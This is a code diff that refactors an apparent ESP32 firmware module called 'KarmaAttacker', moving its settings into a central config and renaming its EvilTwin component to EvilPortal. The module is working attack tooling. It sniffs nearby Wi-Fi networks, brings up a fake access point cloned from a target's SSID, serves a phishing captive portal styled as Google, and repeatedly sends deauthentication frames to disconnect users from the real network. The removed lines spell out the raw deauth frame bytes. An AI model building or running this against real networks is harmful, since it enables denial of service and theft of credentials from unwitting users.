@@ -1,19 +1,7 @@
 #include "KarmaAttacker.h"
 #include "App.h"
 #include "Logger.h"
-
-// (You'll need to define these or pull them from your Deauther)
-static const int CHANNELS_TO_SNIFF[] = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};
-static const unsigned long CHANNEL_HOP_INTERVAL_MS = 250;
-static const unsigned long DEAUTH_INTERVAL_MS = 1000;
-static const uint8_t deauth_frame_template[] = {
-    0xc0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: BROADCAST
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Set to target BSSID
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Set to target BSSID
-    0xf0, 0xff, 0x02, 0x00 
-};
-
+#include "Config.h"
 
 KarmaAttacker* KarmaAttacker::instance_ = nullptr;
 
@@ -38,7 +26,9 @@ void KarmaAttacker::startSniffing() {
     app_->getWifiManager().setHardwareState(true, WifiMode::STA);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
-    esp_wifi_set_channel(CHANNELS_TO_SNIFF[0], WIFI_SECOND_CHAN_NONE);
+    
+    // --- MODIFICATION: Use centralized channel array ---
+    esp_wifi_set_channel(Channels::WIFI_2_4GHZ[0], WIFI_SECOND_CHAN_NONE);
 
     isSniffing_ = true;
     lastChannelHopTime_ = millis();
@@ -63,13 +53,13 @@ bool KarmaAttacker::launchAttack(const SniffedNetworkInfo& target) {
     int fakeApChannel = (currentTarget_.channel == 6) ? 1 : 6;
     
     // We use the EvilTwin's underlying web server, but control the AP ourselves.
-    EvilTwin& evilTwin = app_->getEvilTwin();
-    evilTwin.prepareAttack();
-    evilTwin.setSelectedPortal("google"); // Or your default portal
+    EvilPortal& evilPortal = app_->getEvilPortal();
+    evilPortal.prepareAttack();
+    evilPortal.setSelectedPortal("google"); // Or your default portal
 
     // We need to manually start the AP part
     WiFi.softAP(currentTarget_.ssid.c_str(), nullptr, fakeApChannel);
-    evilTwin.startWebServer(); // ONLY start the web/dns part of the EvilTwin
+    evilPortal.startWebServer(); // ONLY start the web/dns part of the EvilTwin
 
     isAttacking_ = true;
     lastDeauthTime_ = millis();
@@ -81,26 +71,31 @@ void KarmaAttacker::stopAttack() {
     if (!isAttacking_) return;
     LOG(LogLevel::INFO, "KARMA", "Stopping Karma attack.");
     
-    app_->getEvilTwin().stop(); // This will stop the web/dns server
+    app_->getEvilPortal().stop(); // This will stop the web/dns server
     WiFi.softAPdisconnect(true); // Manually stop our AP
 
     isAttacking_ = false;
     app_->getHardwareManager().setPerformanceMode(false);
 }
 
-
 void KarmaAttacker::loop() {
     if (isSniffing_) {
-        // Handle channel hopping
-        if (millis() - lastChannelHopTime_ > CHANNEL_HOP_INTERVAL_MS) {
+        // --- MODIFICATION: Use configurable channel hop delay ---
+        uint32_t channelHopDelay = app_->getConfigManager().getSettings().channelHopDelayMs;
+        
+        if (millis() - lastChannelHopTime_ > channelHopDelay) {
             lastChannelHopTime_ = millis();
-            channelHopIndex_ = (channelHopIndex_ + 1) % (sizeof(CHANNELS_TO_SNIFF) / sizeof(int));
-            esp_wifi_set_channel(CHANNELS_TO_SNIFF[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
+            // --- MODIFICATION: Use centralized channel array and its size ---
+            channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
+            esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
         }
     } else if (isAttacking_) {
-        app_->getEvilTwin().processDns(); // <-- THE FIX
-        // Handle deauthing the REAL AP
-        if (millis() - lastDeauthTime_ > DEAUTH_INTERVAL_MS) {
+        app_->getEvilPortal().processDns(); // processDns from the renamed EvilPortal
+        
+        // --- MODIFICATION: Use configurable attack interval ---
+        uint32_t deauthInterval = app_->getConfigManager().getSettings().attackCooldownMs;
+        
+        if (millis() - lastDeauthTime_ > deauthInterval) {
             lastDeauthTime_ = millis();
             sendDeauthPacket(currentTarget_.bssid);
         }
@@ -187,8 +182,9 @@ void KarmaAttacker::sendDeauthPacket(const uint8_t* targetBssid) {
     // Hop to the REAL AP's channel to send the deauth
     esp_wifi_set_channel(currentTarget_.channel, WIFI_SECOND_CHAN_NONE);
 
-    uint8_t deauth_packet[sizeof(deauth_frame_template)];
-    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
+    // --- MODIFICATION: Use centralized deauth frame template ---
+    uint8_t deauth_packet[sizeof(RawFrames::Mgmt::Deauth::TEMPLATE)];
+    memcpy(deauth_packet, RawFrames::Mgmt::Deauth::TEMPLATE, sizeof(RawFrames::Mgmt::Deauth::TEMPLATE));
     
     memcpy(&deauth_packet[10], targetBssid, 6); // Source Address
     memcpy(&deauth_packet[16], targetBssid, 6); // BSSID
